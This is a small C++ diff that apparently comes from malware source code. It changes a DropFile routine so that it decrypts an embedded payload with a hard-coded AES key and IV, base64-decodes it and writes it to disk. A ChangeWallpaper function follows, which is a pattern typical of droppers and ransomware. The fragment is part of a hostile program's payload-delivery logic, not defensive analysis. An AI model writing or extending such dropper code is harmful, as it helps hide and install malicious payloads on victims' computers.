@@ -101,10 +101,15 @@ bool FileExists(const string& name) {
     return stat(name.c_str(), &buffer) == 0;
 }
 
-void DropFile(const string& content, const string& path) {
+void DropFile(const string& content, const string& path, bool dec) {
+    vector<BYTE> write;
     ofstream fout(path, ios::binary | ios::out);
-    vector<BYTE> write = base64_decode(content);
+    if (dec) 
+        write = base64_decode(aes_decrypt(KEY, content, IV));
+    else
+        write.assign(content.begin(), content.end());
     fout.write((const char*)&write[0], write.size());
+    fout.close();
 }
 
 void ChangeWallpaper(const string& content) {
